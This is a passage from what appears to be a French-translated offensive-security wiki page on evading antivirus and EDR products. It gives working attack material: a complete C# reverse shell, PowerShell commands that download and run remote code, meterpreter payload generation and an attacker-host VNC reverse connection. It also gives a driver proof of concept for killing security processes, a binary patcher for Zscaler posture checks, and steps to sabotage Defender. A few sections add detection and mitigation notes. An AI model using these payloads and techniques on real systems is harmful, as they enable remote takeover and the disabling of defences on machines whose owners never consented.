Exemple d'utilisation :
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) est un puissant mécanisme de journalisation dans Windows qui permet aux applications et composants système de **consigner des événements**. Cependant, il peut aussi être utilisé par les produits de sécurité pour surveiller et détecter des activités malveillantes.

Similaire à la façon dont AMSI est désactivé (bypassed), il est également possible de faire en sorte que la fonction **`EtwEventWrite`** du processus en espace utilisateur retourne immédiatement sans consigner d'événements. Cela se fait en patchant la fonction en mémoire pour qu'elle retourne immédiatement, désactivant ainsi la journalisation ETW pour ce processus.

Vous pouvez trouver plus d'infos dans **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Le chargement de binaires C# en mémoire est connu depuis longtemps et reste un excellent moyen d'exécuter vos outils de post-exploitation sans être détecté par les AV.

Comme le payload sera chargé directement en mémoire sans toucher le disque, nous n'aurons à nous préoccuper que du patch d'AMSI pour tout le processus.

La plupart des frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) offrent déjà la possibilité d'exécuter des assemblies C# directement en mémoire, mais il existe différentes façons de procéder :

- **Fork\&Run**

Cela implique de **créer un nouveau processus sacrificiel**, d'injecter votre code malveillant de post-exploitation dans ce nouveau processus, d'exécuter votre code malveillant et, une fois terminé, de tuer le nouveau processus. Cela comporte des avantages et des inconvénients. L'avantage de la méthode fork and run est que l'exécution se produit **en dehors** de notre processus implant Beacon. Cela signifie que si quelque chose dans notre action de post-exploitation tourne mal ou se fait détecter, il y a une **beaucoup plus grande chance** que notre **implant survive.** L'inconvénient est que vous avez une **plus grande probabilité** d'être détecté par les **détections comportementales**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Il s'agit d'injecter le code malveillant de post-exploitation **dans son propre processus**. De cette façon, vous évitez de devoir créer un nouveau processus et de le faire scanner par l'AV, mais l'inconvénient est que si quelque chose tourne mal lors de l'exécution de votre payload, il y a une **beaucoup plus grande chance** de **perdre votre Beacon** car il pourrait planter.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si vous souhaitez en savoir plus sur le chargement d'Assemblies C#, consultez cet article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) et leur InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Vous pouvez aussi charger des C# Assemblies **depuis PowerShell**, regardez [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) et la vidéo de [S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Comme proposé dans [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), il est possible d'exécuter du code malveillant en utilisant d'autres langages en donnant à la machine compromise accès **à l'environnement d'interpréteur installé sur le partage SMB contrôlé par l'attaquant**.

En autorisant l'accès aux Interpreter Binaries et à l'environnement sur le partage SMB, vous pouvez **exécuter du code arbitraire dans ces langages en mémoire** de la machine compromise.

Le repo indique : Defender scanne toujours les scripts mais en utilisant Go, Java, PHP, etc. nous avons **plus de flexibilité pour contourner les signatures statiques**. Des tests avec des reverse shells aléatoires non obfusqués dans ces langages ont montré leur succès.

## TokenStomping

Token stomping est une technique qui permet à un attaquant de **manipuler le token d'accès ou un produit de sécurité comme un EDR ou AV**, leur permettant de réduire ses privilèges de sorte que le processus ne meure pas mais qu'il n'ait pas les permissions pour vérifier les activités malveillantes.

Pour empêcher cela, Windows pourrait **empêcher des processus externes** d'obtenir des handles sur les tokens des processus de sécurité.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Comme décrit dans [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), il est simple de déployer Chrome Remote Desktop sur un PC victime puis de l'utiliser pour le prendre en main et maintenir la persistance :
1. Téléchargez depuis https://remotedesktop.google.com/, cliquez sur "Set up via SSH", puis cliquez sur le fichier MSI pour Windows pour télécharger le MSI.
2. Exécutez l'installateur silencieusement sur la victime (admin requis) : `msiexec /i chromeremotedesktophost.msi /qn`
3. Revenez à la page Chrome Remote Desktop et cliquez sur next. L'assistant vous demandera alors d'autoriser ; cliquez sur le bouton Authorize pour continuer.
4. Exécutez le paramètre donné avec quelques ajustements : `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Notez le param pin qui permet de définir le code PIN sans utiliser l'interface graphique).

## Advanced Evasion

L'évasion est un sujet très compliqué ; parfois vous devez prendre en compte de nombreuses sources de télémétrie sur un seul système, donc il est pratiquement impossible de rester complètement indétectable dans des environnements matures.

Chaque environnement aura ses propres forces et faiblesses.

Je vous encourage vivement à regarder cette conférence de [@ATTL4S](https://twitter.com/DaniLJ94), pour obtenir une introduction aux techniques d'Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ceci est aussi une autre excellente présentation de [@mariuszbit](https://twitter.com/mariuszbit) sur l'Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Vous pouvez utiliser [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) qui va **supprimer des parties du binaire** jusqu'à ce qu'il **détermine quelle partie Defender** considère comme malveillante et vous la retourne.\
Un autre outil faisant la **même chose est** [**avred**](https://github.com/dobin/avred) avec une offre web publique du service sur [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Jusqu'à Windows10, toutes les versions de Windows fournissaient un **Telnet server** que vous pouviez installer (en tant qu'administrateur) en faisant :
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faites-le **démarrer** au démarrage du système et **exécutez-le** maintenant:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Changer le port telnet** (stealth) et désactiver le firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Téléchargez-le depuis: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vous voulez les bin downloads, pas le setup)

**ON THE HOST** : Exécutez _**winvnc.exe**_ et configurez le serveur :

- Activez l'option _Disable TrayIcon_
- Définissez un mot de passe dans _VNC Password_
- Définissez un mot de passe dans _View-Only Password_

Ensuite, déplacez le binaire _**winvnc.exe**_ et le fichier **nouvellement** créé _**UltraVNC.ini**_ dans le **victim**

#### **Reverse connection**

L'**attacker** doit **exécuter sur** son **host** le binaire `vncviewer.exe -listen 5900` afin d'être **préparé** à accepter une reverse **VNC connection**. Puis, à l'intérieur du **victim** : démarrez le daemon winvnc `winvnc.exe -run` et lancez `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENTION :** Pour rester discret vous ne devez pas faire les actions suivantes

- Ne lancez pas `winvnc` s'il tourne déjà, sinon vous déclencherez une [popup](https://i.imgur.com/1SROTTl.png). Vérifiez s'il tourne avec `tasklist | findstr winvnc`
- Ne lancez pas `winvnc` sans `UltraVNC.ini` dans le même répertoire, sinon cela ouvrira [la fenêtre de configuration](https://i.imgur.com/rfMQWcf.png)
- Ne lancez pas `winvnc -h` pour l'aide, sinon vous déclencherez une [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Téléchargez-le depuis: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
À l'intérieur de GreatSCT :
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Maintenant **démarrez le listener** avec `msfconsole -r file.rc` et **exécutez** le **xml payload** avec :
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**L'anti-malware en place terminera le processus très rapidement.**

### Compilation de notre propre reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Premier C# Revershell

Compilez-le avec:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Utilisez-le avec :
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# en utilisant le compilateur
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Téléchargement et exécution automatiques :
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste d'obfuscateurs C# : [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Exemple d'utilisation de python pour build injectors :

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Autres outils
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Neutraliser AV/EDR depuis l'espace noyau

Storm-2603 a utilisé un petit utilitaire console connu sous le nom de **Antivirus Terminator** pour désactiver les protections endpoint avant de déposer le ransomware. L'outil apporte son **propre pilote vulnérable mais *signé*** et l'abuse pour effectuer des opérations privilégiées dans le noyau que même les services AV Protected-Process-Light (PPL) ne peuvent bloquer.

Points clés
1. **Pilote signé** : Le fichier déposé sur le disque est `ServiceMouse.sys`, mais le binaire est le pilote légitimement signé `AToolsKrnl64.sys` d'Antiy Labs “System In-Depth Analysis Toolkit”. Parce que le pilote porte une signature Microsoft valide, il se charge même lorsque Driver-Signature-Enforcement (DSE) est activé.
2. **Installation du service** :
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La première ligne enregistre le pilote en tant que **service kernel** et la seconde le démarre de sorte que `\\.\ServiceMouse` devienne accessible depuis l'espace utilisateur.
3. **IOCTLs exposés par le pilote**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Pourquoi ça marche** : BYOVD contourne entièrement les protections en mode utilisateur ; le code qui s'exécute dans le noyau peut ouvrir des processus *protégés*, les terminer ou altérer des objets du noyau indépendamment de PPL/PP, ELAM ou d'autres mécanismes de durcissement.

Détection / atténuation
•  Activez la liste de blocage des pilotes vulnérables de Microsoft (`HVCI`, `Smart App Control`) afin que Windows refuse de charger `AToolsKrnl64.sys`.  
•  Surveillez la création de nouveaux services *kernel* et alertez lorsqu'un pilote est chargé depuis un répertoire world-writable ou n'est pas présent sur la allow-list.  
•  Surveillez les handles en mode utilisateur vers des objets device custom suivis d'appels `DeviceIoControl` suspects.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** applique localement des règles de posture device et s'appuie sur Windows RPC pour communiquer les résultats aux autres composants. Deux choix de conception faibles rendent un contournement complet possible :

1. L'évaluation de la posture se fait **entièrement côté client** (un booléen est envoyé au serveur).  
2. Les endpoints RPC internes ne vérifient que si l'exécutable connectant est **signé par Zscaler** (via `WinVerifyTrust`).

En **patchant quatre binaires signés sur disque**, les deux mécanismes peuvent être neutralisés :

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Retourne toujours `1` donc chaque vérification est conforme |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ n'importe quel processus (même non signé) peut se connecter aux pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Court-circuitées |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Après avoir remplacé les fichiers originaux et redémarré la stack de services :

* **Toutes** les vérifications de posture affichent **vert/conforme**.
* Des binaires non signés ou modifiés peuvent ouvrir les named-pipe RPC endpoints (par exemple `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'hôte compromis obtient un accès sans restriction au réseau interne défini par les politiques Zscaler.

Cette étude de cas montre comment des décisions de confiance purement côté client et de simples vérifications de signature peuvent être contournées avec quelques modifications d'octets.

## Abuser Protected Process Light (PPL) pour altérer AV/EDR avec LOLBINs

Protected Process Light (PPL) impose une hiérarchie signer/niveau de sorte que seuls des processus protégés de même niveau ou supérieur peuvent se modifier mutuellement. À des fins offensives, si vous pouvez lancer légitimement un binaire activé PPL et contrôler ses arguments, vous pouvez convertir une fonctionnalité bénigne (par exemple, le logging) en une primitive d'écriture contrainte, soutenue par PPL, ciblant des répertoires protégés utilisés par AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- Le processus doit être créé avec CreateProcess en utilisant les drapeaux : `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Un niveau de protection compatible doit être demandé et correspondre au signer du binaire (par ex., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` pour les signataires anti-malware, `PROTECTION_LEVEL_WINDOWS` pour les signataires Windows). Des niveaux incorrects feront échouer la création.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Modèle d'utilisation :
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive : ClipUp.exe
- Le binaire système signé `C:\Windows\System32\ClipUp.exe` se lance lui-même et accepte un paramètre pour écrire un fichier de log vers un chemin spécifié par l'appelant.
- Lorsqu'il est lancé en tant que processus PPL, l'écriture du fichier se fait avec le support PPL.
- ClipUp ne peut pas analyser les chemins contenant des espaces ; utilisez des chemins courts 8.3 pour pointer vers des emplacements normalement protégés.

8.3 short path helpers
- Lister les noms courts : `dir /x` dans chaque répertoire parent.
- Obtenir le chemin court dans cmd : `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Lancez le LOLBIN capable de PPL (ClipUp) avec `CREATE_PROTECTED_PROCESS` en utilisant un lanceur (p. ex. CreateProcessAsPPL).
2) Passez l'argument log-path de ClipUp pour forcer la création d'un fichier dans un répertoire AV protégé (p. ex. Defender Platform). Utilisez des noms courts 8.3 si nécessaire.
3) Si le binaire cible est normalement ouvert/verrouillé par l'AV pendant son fonctionnement (p. ex. MsMpEng.exe), planifiez l'écriture au démarrage avant le lancement de l'AV en installant un service à démarrage automatique qui s'exécute de manière fiable plus tôt. Validez l'ordre de démarrage avec Process Monitor (journalisation du démarrage).
4) Au redémarrage, l'écriture effectuée avec le support PPL se produit avant que l'AV ne verrouille ses binaires, corrompant le fichier cible et empêchant le démarrage.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes et contraintes
- Vous ne pouvez pas contrôler le contenu que ClipUp écrit au-delà de son emplacement ; la primitive convient davantage à la corruption qu'à l'injection de contenu précise.
- Nécessite un administrateur local/SYSTEM pour installer/démarrer un service et une fenêtre de redémarrage.
- Le timing est critique : la cible ne doit pas être ouverte ; l'exécution au démarrage évite les verrous de fichiers.

Détections
- Création de processus de `ClipUp.exe` avec des arguments inhabituels, en particulier parenté par des lanceurs non standard, autour du démarrage.
- Nouveaux services configurés pour démarrer automatiquement des binaires suspects et démarrant systématiquement avant Defender/AV. Examiner la création/la modification de services avant les échecs de démarrage de Defender.
- Surveillance d'intégrité des fichiers sur les binaires/répertoires Platform de Defender ; créations/modifications de fichiers inattendues par des processus avec des flags de protected-process.
- Télémetrie ETW/EDR : rechercher des processus créés avec `CREATE_PROTECTED_PROCESS` et une utilisation anormale du niveau PPL par des binaires non-AV.

Mesures d'atténuation
- WDAC/Code Integrity : restreindre quels binaires signés peuvent s'exécuter en tant que PPL et sous quels parents ; bloquer l'invocation de ClipUp en dehors des contextes légitimes.
- Hygiène des services : restreindre la création/la modification des services à démarrage automatique et surveiller les manipulations de l'ordre de démarrage.
- Assurer que la protection contre la falsification de Defender et les protections de démarrage précoce sont activées ; investiguer les erreurs de démarrage indiquant une corruption binaire.
- Envisager de désactiver la génération de noms courts 8.3 sur les volumes hébergeant des outils de sécurité si compatible avec votre environnement (tester soigneusement).

Références pour PPL et outils
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Altération de Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender choisit la plateforme depuis laquelle il s'exécute en énumérant les sous-dossiers sous :
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Il sélectionne le sous-dossier avec la chaîne de version lexicographiquement la plus élevée (p.ex., `4.18.25070.5-0`), puis démarre les processus de service Defender à partir de là (mettant à jour les chemins de services/registre en conséquence). Cette sélection fait confiance aux entrées de répertoire, y compris les points de réanalyse (symlinks). Un administrateur peut tirer parti de ceci pour rediriger Defender vers un chemin modifiable par l'attaquant et réaliser du DLL sideloading ou perturber le service.

Préconditions
- Administrateur local (nécessaire pour créer des répertoires/symlinks sous le dossier Platform)
- Capacité à redémarrer ou déclencher la re-sélection de la plateforme de Defender (redémarrage du service au démarrage)
- Seuls des outils intégrés requis (mklink)

Pourquoi ça marche
- Defender bloque les écritures dans ses propres dossiers, mais sa sélection de plateforme fait confiance aux entrées de répertoire et choisit la version lexicographiquement la plus élevée sans valider que la cible se résout en un chemin protégé/de confiance.

Étape par étape (exemple)
1) Préparez un clone inscriptible du dossier Platform courant, p.ex. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Créez un symlink de répertoire de version supérieure à l'intérieur de Platform pointant vers votre dossier :
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Sélection du déclencheur (redémarrage recommandé) :
```cmd
shutdown /r /t 0
```
4) Vérifier que MsMpEng.exe (WinDefend) s'exécute depuis le chemin redirigé :
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Vous devriez observer le nouveau chemin du processus sous `C:\TMP\AV\` et la configuration du service/le registre reflétant cet emplacement.

Options post-exploitation
- DLL sideloading/code execution : Drop/replace DLLs que Defender charge depuis son répertoire d'application pour execute code dans les processus de Defender. Voir la section ci‑dessus : [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial : Remove the version-symlink de sorte qu'au prochain démarrage le chemin configuré ne se résolve pas et que Defender ne puisse pas démarrer :
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Notez que cette technique ne fournit pas de privilege escalation par elle‑même ; elle nécessite des admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Les red teams peuvent déplacer l'évasion à l'exécution hors de l'implant C2 et dans le module cible lui‑même en hookant son Import Address Table (IAT) et en routant des APIs sélectionnées via du position‑independent code contrôlé par l'attaquant (PIC). Cela généralise l'évasion au‑delà de la petite surface d'API que de nombreux kits exposent (par ex., CreateProcessA), et étend les mêmes protections aux BOFs et aux DLLs post‑exploitation.

Approche générale
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- Au chargement de la DLL hôte, parcourir son IMAGE_IMPORT_DESCRIPTOR et patcher les entrées IAT pour les imports ciblés (par ex., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) afin qu'elles pointent vers de fins wrappers PIC.
- Chaque wrapper PIC exécute des évitements avant d'appeler en tail‑call l'adresse réelle de l'API. Les évitements typiques incluent :
  - Masquage/démasquage mémoire autour de l'appel (par ex., encrypt beacon regions, RWX→RX, changement des noms/permissions des pages) puis restauration après l'appel.
  - Call‑stack spoofing : construire une pile bénigne et basculer vers l'API cible pour que l'analyse de la call‑stack résolve sur les frames attendues.
- Pour compatibilité, exporter une interface afin qu'un script Aggressor (ou équivalent) puisse enregistrer quelles APIs hooker pour Beacon, BOFs et DLLs post‑ex.

Why IAT hooking here
- Fonctionne pour tout code qui utilise l'import hooké, sans modifier le code des outils ni dépendre de Beacon pour proxy des APIs spécifiques.
- Couvre les DLLs post‑ex : hooking LoadLibrary* permet d'intercepter les chargements de module (par ex., System.Management.Automation.dll, clr.dll) et d'appliquer le même masquage/évasion de pile à leurs appels d'API.
- Restaure l'utilisation fiable des commandes post‑ex spawnant des processus face aux détections basées sur la call‑stack en enveloppant CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
